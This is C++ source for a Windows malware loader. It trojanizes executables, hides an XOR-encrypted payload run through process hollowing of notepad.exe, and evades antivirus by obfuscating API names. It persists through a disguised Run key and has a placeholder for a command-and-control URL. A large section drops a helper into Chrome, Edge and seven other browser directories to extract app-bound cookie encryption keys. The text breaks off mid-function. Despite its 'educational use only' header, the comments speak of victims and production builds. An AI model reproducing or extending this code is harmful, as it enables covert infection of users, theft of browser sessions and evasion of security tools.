// loader.cpp - process hollowing injector for any .exe the attacker chooses.
//
//   EDUCATIONAL USE ONLY -- FOR SECURITY RESEARCH AND TRAINING
//
//   This is offensive security tooling for penetration testing, red-team exercises,
//   and security education. Only use on systems you own or are explicitly authorized
//   to test. Unauthorized use is illegal. The authors are not responsible for misuse.
//
//   loader.exe -p C:\tools\Host.exe [--kill] [--purge] [-t 60000]
//   -t wait N ms for payload to finish; --kill terminate host after; --purge delete file on reboot
//
//   Standalone mode (infected .exe): when loader.exe itself has a host appended
//   [loader.exe][host.exe bytes][host_len:4 LE][magic "CKLG":4]
//   it extracts the original host, launches it normally (installer/GUI appears),
//   and runs the payload silently via process hollowing -- no visible window.
//
//   AV EVASION (v4):
//   - Payload DLL is XOR-encrypted in payload.h. Decrypted at runtime before injection.
//     This prevents Defender from statically scanning the payload's imports/strings.
//   - Suspicious API calls (WriteProcessMemory, VirtualAllocEx, VirtualProtectEx,
//     CreateRemoteThread) are resolved dynamically via GetProcAddress, removing them
//     from the loader's IAT.
//   - Sacrificial process is notepad.exe (cmd.exe hollowing is a known signature).
//   - C2/persist/anti-VM sentinels are in the LOADER's .data section (plaintext, patchable
//     by auto.py). At runtime, the loader patches them into the decrypted payload buffer.
#define WIN32_LEAN_AND_MEAN
#define _WIN32_WINNT 0x0600
#if defined(_WIN32) || defined(_WIN64)
    #if defined(__has_include)
        #if __has_include(<windows.h>)
            #include <windows.h>
        #elif __has_include(<Windows.h>)
            #include <Windows.h>
        #else
            #error "Windows SDK headers not found. Configure the Windows SDK / MinGW include path."
        #endif
    #else
        #include <windows.h>
    #endif
#else
    #error "This source requires a Windows target."
#endif
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "payload.h"                 // g_payload_enc[], g_xor_key[16], g_payload_len

// GUI subsystem: no console window when the victim double-clicks the infected exe
#pragma comment(linker, "/SUBSYSTEM:WINDOWS")
#pragma comment(linker, "/ENTRY:wmainCRTStartup")

// ------------------------------------------------------------------ sentinels (loader's own copies)
// auto.py/pick.py find these in loader.exe and overwrite with real values.
// At runtime, DecryptPayload() copies these into the decrypted payload buffer.
static char g_c2_url[256]  = "CKC2_DEADBEEF_";               // C2 URL (14-byte sentinel)
static char g_persist[8]   = {'C','K','P','R','_','_','_','_'}; // persistence flag
static char g_skip_av[8]   = {'C','K','A','V','0','0','0','0'}; // anti-VM skip flag

#define STAGE_DIR L"C:\\ProgramData\\MediaCache"

// ------------------------------------------------------------------ dynamic API resolution
// These functions are NOT in the IAT — resolved at runtime to avoid heuristic detection.
// The API names are stored XOR-obfuscated and decoded onto the stack at runtime:
// a plaintext "WriteProcessMemory"/"CreateRemoteThread"/"NtUnmapViewOfSection"
// cluster in .rdata is a static injection signature even when resolved dynamically.
typedef BOOL   (WINAPI *tWriteProcessMemory)(HANDLE,LPVOID,LPCVOID,SIZE_T,SIZE_T*);
typedef LPVOID (WINAPI *tVirtualAllocEx)(HANDLE,LPVOID,SIZE_T,DWORD,DWORD);
typedef BOOL   (WINAPI *tVirtualProtectEx)(HANDLE,LPVOID,SIZE_T,DWORD,PDWORD);
typedef HANDLE (WINAPI *tCreateRemoteThread)(HANDLE,LPSECURITY_ATTRIBUTES,SIZE_T,
                                              LPTHREAD_START_ROUTINE,LPVOID,DWORD,LPDWORD);
typedef LONG   (WINAPI *tUnmap)(HANDLE,PVOID);
typedef LONG   (WINAPI *tNCTE)(HANDLE*,ACCESS_MASK,PVOID,PVOID,PVOID,PVOID,ULONG,ULONG,ULONG,ULONG,PVOID);

template <size_t N> struct EncName {
    char d[N];
    constexpr EncName(const char (&s)[N]) : d{} {
        for(size_t i=0;i<N;i++) d[i]=(char)(s[i]^(char)(0x37+(i&0xF)));
    }
    void dec(char* out) const { for(size_t i=0;i<N;i++) out[i]=(char)(d[i]^(char)(0x37+(i&0xF))); }
};
template <size_t N> static FARPROC ProcObf(HMODULE m, const EncName<N>& e){
    char buf[40]; e.dec(buf);
    return GetProcAddress(m, buf);
}
static constexpr EncName EN_WPM  {"WriteProcessMemory"};
static constexpr EncName EN_VAE  {"VirtualAllocEx"};
static constexpr EncName EN_VPE  {"VirtualProtectEx"};
static constexpr EncName EN_CRT  {"CreateRemoteThread"};
static constexpr EncName EN_UNMAP{"NtUnmapViewOfSection"};
static constexpr EncName EN_NCTE {"NtCreateThreadEx"};

// debug-only trace of every loader exit path -- production builds emit nothing
#ifdef DEBUG
static void LLog(const char* msg, DWORD err){
    CreateDirectoryW(L"C:\\ProgramData\\MediaCache",NULL);
    HANDLE el=CreateFileW(L"C:\\ProgramData\\MediaCache\\cache.log",
        GENERIC_WRITE,0,NULL,OPEN_ALWAYS,0,NULL);
    if(el!=INVALID_HANDLE_VALUE){
        SetFilePointer(el,0,NULL,FILE_END);
        char m2[300]; int n2=wsprintfA(m2,"loader: %s (err=%u)\r\n",msg,err);
        DWORD w2; WriteFile(el,m2,n2,&w2,NULL); CloseHandle(el);
    }
}
#else
static void LLog(const char*, DWORD){}
#endif

// ------------------------------------------------------------------ persistence (loader-side)
// Installs a registry Run key pointing at the hidden infected backup so the payload
// re-runs on every login. Done HERE and not in the payload: the hollowed process
// would register notepad.exe. The backup file is kept (normally it is deleted).
// Run value name is intentionally generic -- the old "WindowsDefenderHelper" was a
// known malware IOC string.
static void InstallRunKey(const wchar_t* exePath){
    HKEY hKey;
    long rc = RegOpenKeyExW(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &hKey);
    if(rc != 0) return;
    rc = RegSetValueExW(hKey, L"MicrosoftEdgeFontCache", 0, REG_SZ,
        (const BYTE*)exePath, (lstrlenW(exePath) + 1) * sizeof(wchar_t));
    RegCloseKey(hKey);
}
// true when the CKPR sentinel in THIS binary was patched to CKPR0001 by auto.py
static bool PersistEnabled(void){
    return g_persist[4]=='0' && g_persist[5]=='0' && g_persist[6]=='0' && g_persist[7]=='1';
}

static PIMAGE_DOS_HEADER Mz(void* b){ return (PIMAGE_DOS_HEADER)b; }
static PIMAGE_NT_HEADERS Nt(void* b){
    PIMAGE_DOS_HEADER d=Mz(b); if(d->e_magic!=IMAGE_DOS_SIGNATURE) return NULL;
    PIMAGE_NT_HEADERS n=(PIMAGE_NT_HEADERS)((BYTE*)b+d->e_lfanew);
    return n->Signature==IMAGE_NT_SIGNATURE ? n : NULL;
}
static bool IsClr(void* b){ PIMAGE_NT_HEADERS n=Nt(b); return n && n->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR].VirtualAddress!=0; }

// Convert RVA (relative virtual address) to raw file offset
static DWORD Rva2Off(PIMAGE_NT_HEADERS nt, DWORD rva){
    PIMAGE_SECTION_HEADER sec=IMAGE_FIRST_SECTION(nt);
    for(WORD i=0;i<nt->FileHeader.NumberOfSections;i++,sec++){
        if(rva>=sec->VirtualAddress && rva<sec->VirtualAddress+sec->Misc.VirtualSize)
            return rva-sec->VirtualAddress+sec->PointerToRawData;
    }
    return rva;
}

// ------------------------------------------------------------------ v20 key stage
// Chrome 127+ wraps the cookie key with the app-bound scheme: SYSTEM DPAPI plus
// the user's DPAPI, unwrapped only by the browser's Elevation Service. The
// service validates the caller path, so a helper is copied into the browser's
// Application directory, run once, and deleted. Writing there requires an
// elevated token; when the loader is not elevated the stage is skipped and the
// payload simply reports no-key for app-bound browsers. Nothing here can abort
// the run -- a failed key stage costs Chrome/Edge cookies, not the payload.
//
// The helper (ckdec.exe) is embedded in this exe as RCDATA and understands the
// CLSID argument, so Edge and Chromium forks work without their own builds.

static bool IsElevated(void){
    HANDLE tok=NULL;
    if(!OpenProcessToken(GetCurrentProcess(),TOKEN_QUERY,&tok)) return false;
    TOKEN_ELEVATION te; DWORD n=0; bool elevated=false;
    if(GetTokenInformation(tok,TokenElevation,&te,sizeof(te),&n))
        elevated = te.TokenIsElevated!=0;
    CloseHandle(tok);
    return elevated;
}

static void DirName(const wchar_t* path, wchar_t* out){
    lstrcpyW(out,path);
    wchar_t* p=out+lstrlenW(out);
    while(p>out && p[-1]!=L'\\' && p[-1]!=L'/') p--;
    if(p>out) p[-1]=0;
}

static bool EndsWithI(const wchar_t* s, const wchar_t* suffix){
    size_t n=lstrlenW(s), m=lstrlenW(suffix);
    if(m>n) return false;
    return lstrcmpiW(s+n-m,suffix)==0;
}

// true when path is dir itself or lives inside it
static bool IsUnderDir(const wchar_t* path, const wchar_t* dir){
    size_t n=lstrlenW(dir);
    if(n==0 || _wcsnicmp(path,dir,n)!=0) return false;
    return path[n]==0 || path[n]==L'\\' || path[n]==L'/';
}

// LocalServer32 may be quoted and may carry -Embedding: keep the executable only
static void ServerExePath(const wchar_t* raw, wchar_t* out){
    const wchar_t* p=raw;
    while(*p==L' '||*p==L'\t') p++;
    DWORD i=0;
    if(*p==L'"'){
        p++;
        while(*p && *p!=L'"' && i<MAX_PATH*2-1) out[i++]=*p++;
    } else {
        while(*p && *p!=L' ' && *p!=L'\t' && i<MAX_PATH*2-1) out[i++]=*p++;
    }
    out[i]=0;
}

// Chrome and Edge register their elevator under HKLM (system install) or HKCU
// (per-user install) as
//   CLSID\{...}\LocalServer32 = <Application>\<version>\elevation_service.exe
// The browser is picked by matching the service path against the install tree
// we resolved, so a stale CLSID from a removed browser cannot win.
static bool FindElevatorClsid(const wchar_t* app_dir, wchar_t* out, DWORD cap){
    // 64-bit view, 32-bit view (a 32-bit browser on x64 registers under
    // Wow6432Node), and the per-user hives for per-user installs.
    static const struct { HKEY hive; const wchar_t* sub; } roots[4] = {
        {HKEY_LOCAL_MACHINE, L"SOFTWARE\\Classes\\CLSID"},
        {HKEY_LOCAL_MACHINE, L"SOFTWARE\\Classes\\Wow6432Node\\CLSID"},
        {HKEY_CURRENT_USER,  L"SOFTWARE\\Classes\\CLSID"},
        {HKEY_CURRENT_USER,  L"SOFTWARE\\Classes\\Wow6432Node\\CLSID"},
    };
    for(int h=0;h<4;h++){
        HKEY cls=NULL;
        if(RegOpenKeyExW(roots[h].hive,roots[h].sub,0,KEY_READ,&cls)!=0) continue;
        wchar_t name[128];
        for(DWORD i=0;;i++){
            DWORD n=128;
            if(RegEnumKeyExW(cls,i,name,&n,NULL,NULL,NULL,NULL)!=ERROR_SUCCESS) break;
            HKEY ck=NULL;
            if(RegOpenKeyExW(cls,name,0,KEY_QUERY_VALUE,&ck)!=0) continue;
            HKEY ls=NULL;
            if(RegOpenKeyExW(ck,L"LocalServer32",0,KEY_QUERY_VALUE,&ls)==0){
                wchar_t raw[MAX_PATH*2]; DWORD cb=(DWORD)sizeof(raw); DWORD type=0;
                if(RegQueryValueExW(ls,NULL,NULL,&type,(BYTE*)raw,&cb)==0 &&
                   (type==REG_SZ||type==REG_EXPAND_SZ)){
                    raw[MAX_PATH*2-1]=0;
                    wchar_t exe[MAX_PATH*2];
                    ServerExePath(raw,exe);
                    if(EndsWithI(exe,L"\\elevation_service.exe") && IsUnderDir(exe,app_dir)){
                        DWORD cch=(DWORD)lstrlenW(name);
                        if(cch+1<cap){
                            lstrcpyW(out,name);
                            RegCloseKey(ls); RegCloseKey(ck); RegCloseKey(cls);
                            return true;
                        }
                    }
                }
                RegCloseKey(ls);
            }
            RegCloseKey(ck);
        }
        RegCloseKey(cls);
    }
    return false;
}

// Browser install layouts. rel is the User Data dir under LOCALAPPDATA or
// APPDATA; exe is the App Paths name; the last three are fallbacks under
// ProgramFiles, ProgramFiles(x86) and LOCALAPPDATA. Names must match the
// payload's g_br[] so the mc-<name>.key file lands where it is read.
struct KeyTarget {
    const wchar_t* name;
    const wchar_t* rel;
    const wchar_t* exe;
    const wchar_t* pf;
    const wchar_t* pf86;
    const wchar_t* la;
};
static const KeyTarget kKeyTargets[] = {
    {L"chrome",   L"\\Google\\Chrome\\User Data", L"chrome.exe",
     L"\\Google\\Chrome\\Application\\chrome.exe",
     L"\\Google\\Chrome\\Application\\chrome.exe",
     L"\\Google\\Chrome\\Application\\chrome.exe"},
    {L"edge",     L"\\Microsoft\\Edge\\User Data", L"msedge.exe",
     L"\\Microsoft\\Edge\\Application\\msedge.exe",
     L"\\Microsoft\\Edge\\Application\\msedge.exe",
     L"\\Microsoft\\Edge\\Application\\msedge.exe"},
    {L"brave",    L"\\BraveSoftware\\Brave-Browser\\User Data", L"brave.exe",
     L"\\BraveSoftware\\Brave-Browser\\Application\\brave.exe",
     L"\\BraveSoftware\\Brave-Browser\\Application\\brave.exe",
     L"\\BraveSoftware\\Brave-Browser\\Application\\brave.exe"},
    {L"vivaldi",  L"\\Vivaldi\\User Data", L"vivaldi.exe",
     NULL, NULL, L"\\Vivaldi\\Application\\vivaldi.exe"},
    {L"opera",    L"\\Opera Software\\Opera Stable", L"opera.exe",
     L"\\Opera\\opera.exe", NULL, L"\\Programs\\Opera\\opera.exe"},
    {L"chromium", L"\\Chromium\\User Data", L"chromium.exe",
     L"\\Chromium\\Application\\chromium.exe", NULL,
     L"\\Chromium\\Application\\chromium.exe"},
    {L"thorium",  L"\\Thorium\\User Data", L"thorium.exe",
     L"\\Thorium\\Application\\thorium.exe", NULL,
     L"\\Thorium\\Application\\thorium.exe"},
    {L"coccoc",   L"\\CocCoc\\Browser\\User Data", L"browser.exe",
     L"\\CocCoc\\Browser\\Application\\browser.exe",
     L"\\CocCoc\\Browser\\Application\\browser.exe", NULL},
    {L"yandex",   L"\\Yandex\\YandexBrowser\\User Data", L"browser.exe",
     L"\\Yandex\\YandexBrowser\\Application\\browser.exe", NULL,
     L"\\Yandex\\YandexBrowser\\Application\\browser.exe"},
};

// App Paths first (authoritative), then the known layouts. A path that does not
// exist is rejected: stale App Paths entries are common after a browser update.
static bool ResolveBrowserExe(const KeyTarget& t, wchar_t* out, DWORD cap){
    HKEY hives[2]={HKEY_CURRENT_USER,HKEY_LOCAL_MACHINE};
    for(int h=0;h<2;h++){
        wchar_t sub[512];
        wsprintfW(sub,L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\%s",t.exe);
        HKEY k=NULL;
        if(RegOpenKeyExW(hives[h],sub,0,KEY_QUERY_VALUE,&k)!=0) continue;
        wchar_t val[MAX_PATH*2]; DWORD cb=(DWORD)sizeof(val); DWORD type=0;
        bool got=RegQueryValueExW(k,NULL,NULL,&type,(BYTE*)val,&cb)==0 && type==REG_SZ;
        RegCloseKey(k);
        if(got){
            val[MAX_PATH*2-1]=0;
            if(GetFileAttributesW(val)!=INVALID_FILE_ATTRIBUTES){
                lstrcpynW(out,val,(int)cap);
                return true;
            }
        }
    }
    wchar_t roots[3][MAX_PATH];
    roots[0][0]=roots[1][0]=roots[2][0]=0;
    GetEnvironmentVariableW(L"ProgramFiles",roots[0],MAX_PATH);
    GetEnvironmentVariableW(L"ProgramFiles(x86)",roots[1],MAX_PATH);
    GetEnvironmentVariableW(L"LOCALAPPDATA",roots[2],MAX_PATH);
    const wchar_t* rels[3]={t.pf,t.pf86,t.la};
    for(int i=0;i<3;i++){
        if(!rels[i]||!roots[i][0]) continue;
        wsprintfW(out,L"%s%s",roots[i],rels[i]);
        if(GetFileAttributesW(out)!=INVALID_FILE_ATTRIBUTES) return true;
    }
    return false;
}

static bool WriteAllBytes(const wchar_t* path, const void* data, DWORD len){
    HANDLE h=CreateFileW(path,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
    if(h==INVALID_HANDLE_VALUE) return false;
    DWORD wr=0; bool ok=WriteFile(h,data,len,&wr,NULL)!=FALSE && wr==len;
    CloseHandle(h);
    return ok;
}

// ckdec.exe as RCDATA (src\loader.rc). Dropped into <Application>\fontcache.exe:
// the Elevation Service trims the caller path to the install root and refuses
// anything outside it.
static bool DeployHelper(const wchar_t* dest){
    HRSRC r=FindResourceW(NULL,L"CKHELP",MAKEINTRESOURCEW(10));
    if(!r) return false;
    HGLOBAL g=LoadResource(NULL,r);
    DWORD sz=SizeofResource(NULL,r);
    void* p=g?LockResource(g):NULL;
    if(!p||!sz) return false;
    if(!WriteAllBytes(dest,p,sz)){ DeleteFileW(dest); return false; }
    return true;
}

static bool RunHelper(const wchar_t* helper, const wchar_t* appb,
                      const wchar_t* keyfile, const wchar_t* clsid){
    wchar_t cmd[2048];
    wsprintfW(cmd,L"\"%s\" \"%s\" \"%s\" \"%s\"",helper,appb,keyfile,clsid);
    STARTUPINFOW si; memset(&si,0,sizeof(si)); si.cb=sizeof(si);
    PROCESS_INFORMATION pi; memset(&pi,0,sizeof(pi));
    if(!CreateProcessW(NULL,cmd,NULL,NULL,FALSE,CREATE_NO_WINDOW,NULL,NULL,&si,&pi)){
        LLog("key stage: helper launch failed",GetLastError());
        return false;
    }
    DWORD w=WaitForSingleObject(pi.hProcess,60000);
    DWORD code=1;
    GetExitCodeProcess(pi.hProcess,&code);
    CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
    if(w!=WAIT_OBJECT_0||code!=0){
        LLog("key stage: helper exit",code);
        return false;
    }
    return true;
}

#ifdef DEBUG
static void KeyLog(const wchar_t* name, const char* msg, DWORD err){
    char m[360];
    wsprintfA(m,"key stage[%S]: %s",name?name:L"?",msg);
    LLog(m,err);
}
#else
static void KeyLog(const wchar_t*, const char*, DWORD){}
#endif

// Copy the base64 value of "app_bound_encrypted_key" out of Local State.
// Returns a VirtualAlloc'd, null-terminated string.
static bool ReadAppBound(const wchar_t* path, char** out, DWORD* out_len){
    HANDLE h=CreateFileW(path,GENERIC_READ,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,
                         OPEN_EXISTING,0,NULL);
    if(h==INVALID_HANDLE_VALUE) return false;
    LARGE_INTEGER sz;
    if(!GetFileSizeEx(h,&sz)||sz.QuadPart<=0||sz.QuadPart>8*1024*1024){
        CloseHandle(h); return false;
    }
    DWORD len=(DWORD)sz.QuadPart;
    char* buf=(char*)VirtualAlloc(NULL,len+1,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
    if(!buf){ CloseHandle(h); return false; }
    DWORD rd=0;
    BOOL read_ok=ReadFile(h,buf,len,&rd,NULL);
    CloseHandle(h);
    if(!read_ok||!rd){ VirtualFree(buf,0,MEM_RELEASE); return false; }
    buf[rd]=0;

    static const char key[]="\"app_bound_encrypted_key\"";
    const DWORD klen=(DWORD)(sizeof(key)-1);
    const char* end=buf+rd;
    const char* c=NULL;
    for(char* p=buf; p+klen<end; p++){
        if(*p=='"'&&memcmp(p,key,klen)==0){ c=p+klen; break; }
    }
    if(!c){ VirtualFree(buf,0,MEM_RELEASE); return false; }
    while(c<end && *c && *c!=':') c++;
    if(c>=end||!*c){ VirtualFree(buf,0,MEM_RELEASE); return false; }
    c++;
    while(c<end && (*c==' '||*c=='\t'||*c=='\r'||*c=='\n')) c++;
    if(c>=end||*c!='"'){ VirtualFree(buf,0,MEM_RELEASE); return false; }
    const char* v=c+1;
    const char* e=v;
    while(e<end && *e && *e!='"') e++;
    DWORD n=(DWORD)(e-v);
    if(n<8||n>65536){ VirtualFree(buf,0,MEM_RELEASE); return false; }
    char* val=(char*)VirtualAlloc(NULL,n+1,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
    if(!val){ VirtualFree(buf,0,MEM_RELEASE); return false; }
    memcpy(val,v,n); val[n]=0;
    VirtualFree(buf,0,MEM_RELEASE);
    *out=val; *out_len=n;
    return true;
}

static void StageOneKey(const KeyTarget& t, const char* b64, DWORD b64_len){
    wchar_t exe[MAX_PATH];
    if(!ResolveBrowserExe(t,exe,MAX_PATH)){
        KeyLog(t.name,"browser exe not found",0); return;
    }
    wchar_t appdir[MAX_PATH];
    DirName(exe,appdir);
    wchar_t clsid[80];
    if(!FindElevatorClsid(appdir,clsid,80)){
        KeyLog(t.name,"elevation service CLSID not found",0); return;
    }
    wchar_t helper[MAX_PATH*2], appb[MAX_PATH*2], key[MAX_PATH*2];
    wsprintfW(helper,L"%s\\fontcache.exe",appdir);
    wsprintfW(appb,L"%s\\stage-%s.appb",STAGE_DIR,t.name);
    wsprintfW(key,L"%s\\mc-%s.key",STAGE_DIR,t.name);
    if(!DeployHelper(helper)){
        KeyLog(t.name,"helper deploy failed",GetLastError()); return;
    }
    if(!WriteAllBytes(appb,b64,b64_len)){
        KeyLog(t.name,"appb write failed",GetLastError());
        DeleteFileW(helper); return;
    }
    DeleteFileW(key);                       // never accept a stale key
    bool ok=RunHelper(helper,appb,key,clsid);
    DeleteFileW(helper);                    // the service is done with the path
    DeleteFileW(appb);
    if(!ok){ KeyLog(t.name,"service call failed",0); return; }
    HANDLE k=CreateFileW(key,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
    if(k==INVALID_HANDLE_VALUE){ KeyLog(t.name,"no key file after service",0); return; }
    LARGE_INTEGER ks; bool size_ok=GetFileSizeEx(k,&ks)!=FALSE && ks.QuadPart==32;
    CloseHandle(k);
    if(!size_ok){
        DeleteFileW(key); KeyLog(t.name,"key is not 32 bytes",0); return;
    }
    KeyLog(t.name,"v20 key written",0);
}

static void RunKeyStage(bool keydebug){
#ifdef DEBUG
    bool allow_unelevated=keydebug;
#else
    bool allow_unelevated=false;
    (void)keydebug;
#endif
    if(!allow_unelevated && !IsElevated()){
        LLog("key stage: skipped (not elevated)",0); return;
    }
    wchar_t la[MAX_PATH]; la[0]=0;
    wchar_t aa[MAX_PATH]; aa[0]=0;
    bool have_la=GetEnvironmentVariableW(L"LOCALAPPDATA",la,MAX_PATH)!=0;
    bool have_aa=GetEnvironmentVariableW(L"APPDATA",aa,MAX_PATH)!=0;
    if(!have_la&&!have_aa){ LLog("key stage: no profile env",0); return; }
    CreateDirectoryW(STAGE_DIR,NULL);
    for(unsigned i=0;i<sizeof(kKeyTargets)/sizeof(kKeyTargets[0]);i++){
        const KeyTarget& t=kKeyTargets[i];
        wchar_t ls[MAX_PATH*2]; bool found=false;
        if(have_la){
            wsprintfW(ls,L"%s%s\\Local State",la,t.rel);
            if(GetFileAttributesW(ls)!=INVALID_FILE_ATTRIBUTES) found=true;
        }
        if(!found&&have_aa){
            wsprintfW(ls,L"%s%s\\Local State",aa,t.rel);
            if(GetFileAttributesW(ls)!=INVALID_FILE_ATTRIBUTES) found=true;
        }
        if(!found) continue;
        char* b64=NULL; DWORD b64_len=0;
        if(!ReadAppBound(ls,&b64,&b64_len)){
            KeyLog(t.name,"no app_bound_encrypted_key",0); continue;
        }
        StageOneKey(t,b64,b64_len);
        VirtualFree(b64,0,MEM_RELEASE);
    }
}

// ------------------------------------------------------------------ payload decryption + sentinel patching
// Decrypts the XOR-encrypted payload, patches the C2/persist/anti-VM sentinels
// from the loader's own copies into the decrypted buffer, and returns it.
// Caller must free() the returned buffer.
static BYTE* DecryptPayload(void){
    BYTE* buf = (BYTE*)malloc(g_payload_len);
    if(!buf) return NULL;
    // XOR decrypt
    for(unsigned i=0; i<g_payload_len; i++)
        buf[i] = g_payload_enc[i] ^ g_xor_key[i & 15];

    // Patch C2 sentinel: search for "CKC2_DEADBEEF_" (14 bytes) in decrypted payload
    const char c2_sentinel[14] = {'C','K','C','2','_','D','E','A','D','B','E','E','F','_'};
    for(unsigned i=0; i+14 <= g_payload_len; i++){
        if(memcmp(buf+i, c2_sentinel, 14)==0){
            memcpy(buf+i, g_c2_url, 256);
            break;
        }
    }
    // Patch persistence sentinel: search for "CKPR____" (8 bytes)
    const char pr_sentinel[8] = {'C','K','P','R','_','_','_','_'};
    for(unsigned i=0; i+8 <= g_payload_len; i++){
        if(memcmp(buf+i, pr_sentinel, 8)==0){
            memcpy(buf+i, g_persist, 8);
            break;
        }
    }
    // Patch anti-VM sentinel: search for "CKAV0000" (8 bytes)
    const char av_sentinel[8] = {'C','K','A','V','0','0','0','0'};
    for(unsigned i=0; i+8 <= g_payload_len; i++){
        if(memcmp(buf+i, av_sentinel, 8)==0){
            memcpy(buf+i, g_skip_av, 8);
            break;
        }
    }
    return buf;
}

int wmain(int argc,wchar_t** argv){
    wchar_t* target=NULL; bool kill=false, purge=false, keydebug=false; DWORD wait=5000;
#ifdef DEBUG
    bool keystage_only=false;
#endif
    static wchar_t target_buf[MAX_PATH];               // buffer for standalone mode
    for(int i=1;i<argc;i++){
        if(!lstrcmpW(argv[i],L"-p")&&i+1<argc) target=argv[++i];
        else if(!lstrcmpW(argv[i],L"--kill")) kill=true;
        else if(!lstrcmpW(argv[i],L"--purge")) purge=true;
        // debug builds only: run the key stage without an elevated token so the
        // discovery path can be exercised on the bench (production = gate only)
        else if(!lstrcmpW(argv[i],L"--keydebug")) keydebug=true;
#ifdef DEBUG
        else if(!lstrcmpW(argv[i],L"--keystage-only")) keystage_only=true;
#endif
        else if(!lstrcmpW(argv[i],L"-t")&&i+1<argc) wait=(DWORD)_wtoi(argv[++i]);
    }

    // Standalone mode: if no -p target given, look for a host exe appended to this exe.
    // Format: [loader.exe][host.exe bytes][host_len:4 LE][magic "CKLG":4]
    // Flow: extract original host -> launch normally (game/installer appears) ->
    //       hollow a sacrificial notepad.exe with the payload -> payload runs hidden
    if(!target){
        wchar_t self[MAX_PATH]; GetModuleFileNameW(NULL,self,MAX_PATH);
        HANDLE hs=CreateFileW(self,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
        if(hs!=INVALID_HANDLE_VALUE){
            LARGE_INTEGER fsize; GetFileSizeEx(hs,&fsize);
            bool found=false;
            if(fsize.QuadPart>12){
                LARGE_INTEGER pos; pos.QuadPart=fsize.QuadPart-8;
                SetFilePointerEx(hs,pos,NULL,FILE_BEGIN);
                BYTE tail[8]; DWORD rd2=0; ReadFile(hs,tail,8,&rd2,NULL);
                if(rd2==8 && tail[4]=='C' && tail[5]=='K' && tail[6]=='L' && tail[7]=='G'){
                    DWORD host_len=*(DWORD*)tail;
                    if(host_len>0 && host_len<(DWORD)(fsize.QuadPart-8)){
                        // 1. Extract original host bytes
                        pos.QuadPart=fsize.QuadPart-8-host_len;
                        SetFilePointerEx(hs,pos,NULL,FILE_BEGIN);
                        BYTE* hbuf=(BYTE*)VirtualAlloc(NULL,host_len,MEM_COMMIT,PAGE_READWRITE);
                        DWORD r3=0; ReadFile(hs,hbuf,host_len,&r3,NULL);
                        CloseHandle(hs); found=true;

                        // 2. Rename-restore: rename the infected .exe to a hidden temp,
                        //    and write the original host bytes back to the ORIGINAL filename.
                        //    Reason: Unity games derive their data path from the exe name
                        //    (they look for <name>_Data/). If we extract as ~ck_tmp.exe,
                        //    Unity looks for ~ck_tmp_Data/ and fails.
                        //    With rename-restore, the host runs with its original name
                        //    and finds <name>_Data/, UnityPlayer.dll, etc.

                        // Directory of the infected .exe
                        wchar_t wdir[MAX_PATH]; lstrcpyW(wdir,self);
                        wchar_t* s2=wdir+lstrlenW(wdir);
                        while(s2>wdir && s2[-1]!=L'\\') s2--;
                        *s2=0;

                        // Temp name to stash the infected exe: <dir>\~ck_bak.bin
                        // Hidden + System attributes so it doesn't show in Explorer
                        wchar_t bak[MAX_PATH]; lstrcpyW(bak,wdir);
                        lstrcatW(bak,L"~ck_bak.bin");
                        DeleteFileW(bak);

                        // Original .exe name (self) = where we write the clean host
                        wchar_t origName[MAX_PATH]; lstrcpyW(origName,self);

                        // Rename infected -> ~ck_bak.bin
                        BOOL renamed = MoveFileExW(origName,bak,MOVEFILE_REPLACE_EXISTING);

                        // Hide ~ck_bak.bin immediately after rename
                        if(renamed){
                            SetFileAttributesW(bak, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
                        }

                        wchar_t runExe[MAX_PATH];
                        if(renamed){
                            // Write original host to the original filename
                            HANDLE horig=CreateFileW(origName,GENERIC_WRITE,0,NULL,
                                                     CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
                            if(horig!=INVALID_HANDLE_VALUE){
                                WriteFile(horig,hbuf,host_len,&r3,NULL); CloseHandle(horig);
                            }
                            lstrcpyW(runExe,origName);
                        } else {
                            // Fallback: extract as ~ck_tmp.exe
                            lstrcpyW(runExe,wdir); lstrcatW(runExe,L"~ck_tmp.exe");
                            HANDLE htmp=CreateFileW(runExe,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,
                                                    FILE_ATTRIBUTE_HIDDEN,NULL);
                            if(htmp!=INVALID_HANDLE_VALUE){
                                WriteFile(htmp,hbuf,host_len,&r3,NULL); CloseHandle(htmp);
                            }
                        }
                        VirtualFree(hbuf,0,MEM_RELEASE);

                        // 3. Launch original host normally (game/installer/GUI appears)
                        STARTUPINFOW si2={sizeof(si2)};
                        si2.dwFlags=STARTF_USESHOWWINDOW;
                        si2.wShowWindow=SW_SHOWNORMAL;
                        PROCESS_INFORMATION pi2; memset(&pi2,0,sizeof(pi2));
                        BOOL hp=CreateProcessW(runExe,NULL,NULL,NULL,FALSE,
                                       CREATE_DEFAULT_ERROR_MODE,NULL,wdir,&si2,&pi2);
                        if(!hp){
#ifdef DEBUG
                            // debug-only: never write a trace file on a production victim
                            CreateDirectoryW(L"C:\\ProgramData\\MediaCache",NULL);
                            HANDLE el=CreateFileW(L"C:\\ProgramData\\MediaCache\\cache.log",
                                GENERIC_WRITE,0,NULL,OPEN_ALWAYS,0,NULL);
                            if(el!=INVALID_HANDLE_VALUE){
                                SetFilePointer(el,0,NULL,FILE_END);
                                char msg[300]; int n=wsprintfA(msg,
                                    "CreateProcessW host failed: err=%u path=%S\r\n",
                                    GetLastError(),runExe);
                                DWORD w2; WriteFile(el,msg,n,&w2,NULL); CloseHandle(el);
                            }
#endif
                        }
                        if(pi2.hProcess){ CloseHandle(pi2.hThread); CloseHandle(pi2.hProcess); }

                        // 3b. Clean up the temp file -- unless persistence is enabled:
                        // then register the hidden copy in Run and keep it as the
                        // payload carrier (the main exe is now the clean host)
